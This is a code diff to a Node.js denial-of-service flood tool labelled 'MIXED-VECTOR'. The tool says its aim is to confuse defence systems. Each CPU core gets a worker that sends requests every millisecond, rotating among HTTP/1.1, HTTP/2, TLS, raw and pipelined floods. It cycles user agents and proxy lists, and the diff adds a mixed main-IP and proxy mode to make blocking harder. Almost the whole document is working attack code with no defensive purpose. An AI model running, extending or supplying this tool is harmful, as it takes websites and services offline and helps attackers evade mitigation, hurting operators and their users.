@@ -1,8 +1,10 @@
 // R10-9: MIXED-VECTOR - Combined Attack Methods
 // Focus: Confuse defense systems
 // Technique: Rotate between all attack vectors
+// Updated: Mixed main IP + proxies
 
 const http = require('http');
+const https = require('https');
 const http2 = require('http2');
 const tls = require('tls');
 const net = require('net');
@@ -22,8 +24,12 @@ try {
         .filter(line => line && !line.startsWith('#') && line.includes(':'));
     console.log(`[R10-9] Loaded ${proxies.length} proxies`);
 } catch (e) {
-    console.log('[R10-9] No proxy.txt found, running without proxies');
+    console.log('[R10-9] No proxy.txt found, running with main IP only');
 }
+
+// Mix settings
+const USE_MAIN_IP = true;
+const MIX_RATIO = 0.3; // 30% main IP
 
 try {
     userAgents = fs.readFileSync('ua.txt', 'utf-8').split('\n')
@@ -34,8 +40,13 @@ try {
 
 const methods = ['http1', 'http2', 'tls', 'raw', 'pipeline'];
 
+function shouldUseMainIp() {
+    return USE_MAIN_IP && Math.random() < MIX_RATIO;
+}
+
 if (cluster.isMaster) {
     console.log(`[R10-9] MIXED-VECTOR launching on ${CPU_CORES} cores`);
+    console.log(`[R10-9] Mode: ${USE_MAIN_IP ? 'MIXED' : 'PROXY-ONLY'} (${MIX_RATIO*100}% main IP)`);
     for (let i = 0; i < CPU_CORES; i++) cluster.fork();
     
     setTimeout(() => process.exit(0), process.argv[3] * 1000 || 300);
@@ -45,25 +56,31 @@ if (cluster.isMaster) {
     
     let requestCount = 0;
     let methodCounts = {};
+    let mainIpCount = 0;
+    let proxyCount = 0;
     
     const interval = setInterval(() => {
         const method = methods[Math.floor(Math.random() * methods.length)];
+        const useMain = shouldUseMainIp();
+        
+        if (useMain) mainIpCount++;
+        else proxyCount++;
         
         switch(method) {
             case 'http1':
-                sendHTTP1(target);
+                sendHTTP1(target, useMain);
                 break;
             case 'http2':
-                sendHTTP2(target);
+                sendHTTP2(target, useMain);
                 break;
             case 'tls':
-                sendTLS(target);
+                sendTLS(target, useMain);
                 break;
             case 'raw':
-                sendRaw(target);
+                sendRaw(target, useMain);
                 break;
             case 'pipeline':
-                sendPipeline(target);
+                sendPipeline(target, useMain);
                 break;
         }
         
@@ -71,9 +88,9 @@ if (cluster.isMaster) {
         requestCount++;
     }, 1);
     
-    function sendHTTP1(target) {
+    function sendHTTP1(target, useMain) {
         try {
-            if (proxies.length > 0) {
+            if (!useMain && proxies.length > 0) {
                 const proxy = proxies[Math.floor(Math.random() * proxies.length)];
                 const [proxyHost, proxyPort] = proxy.split(':');
                 
@@ -101,7 +118,7 @@ if (cluster.isMaster) {
                 });
                 req.end();
             } else {
-                // Direct HTTP/1.1
+                // Direct HTTP/1.1 (main IP)
                 const ua = userAgents.length > 0 
                     ? userAgents[Math.floor(Math.random() * userAgents.length)]
                     : 'Mozilla/5.0';
@@ -126,7 +143,7 @@ if (cluster.isMaster) {
         } catch (e) {}
     }
     
-    function sendHTTP2(target) {
+    function sendHTTP2(target, useMain) {
         try {
             const ua = userAgents.length > 0 
                 ? userAgents[Math.floor(Math.random() * userAgents.length)]
@@ -144,9 +161,9 @@ if (cluster.isMaster) {
         } catch (e) {}
     }
     
-    function sendTLS(target) {
+    function sendTLS(target, useMain) {
         try {
-            if (proxies.length > 0) {
+            if (!useMain && proxies.length > 0) {
                 const proxy = proxies[Math.floor(Math.random() * proxies.length)];
                 const [proxyHost, proxyPort] = proxy.split(':');
                 
@@ -172,9 +189,9 @@ if (cluster.isMaster) {
         } catch (e) {}
     }
     
-    function sendRaw(target) {
+    function sendRaw(target, useMain) {
         try {
-            if (proxies.length > 0) {
+            if (!useMain && proxies.length > 0) {
                 const proxy = proxies[Math.floor(Math.random() * proxies.length)];
                 const [proxyHost, proxyPort] = proxy.split(':');
                 
@@ -203,9 +220,9 @@ if (cluster.isMaster) {
         } catch (e) {}
     }
     
-    function sendPipeline(target) {
+    function sendPipeline(target, useMain) {
         try {
-            if (proxies.length > 0) {
+            if (!useMain && proxies.length > 0) {
                 const proxy = proxies[Math.floor(Math.random() * proxies.length)];
                 const [proxyHost, proxyPort] = proxy.split(':');
                 
@@ -243,10 +260,12 @@ if (cluster.isMaster) {
     }
     
     setInterval(() => {
-        console.log(`[R10-9] Total RPS: ${requestCount}`);
+        console.log(`[R10-9] Total RPS: ${requestCount} | Main: ${mainIpCount} | Proxy: ${proxyCount}`);
         console.log('Methods:', methodCounts);
         requestCount = 0;
         methodCounts = {};
+        mainIpCount = 0;
+        proxyCount = 0;
     }, 1000);
     
     setTimeout(() => {
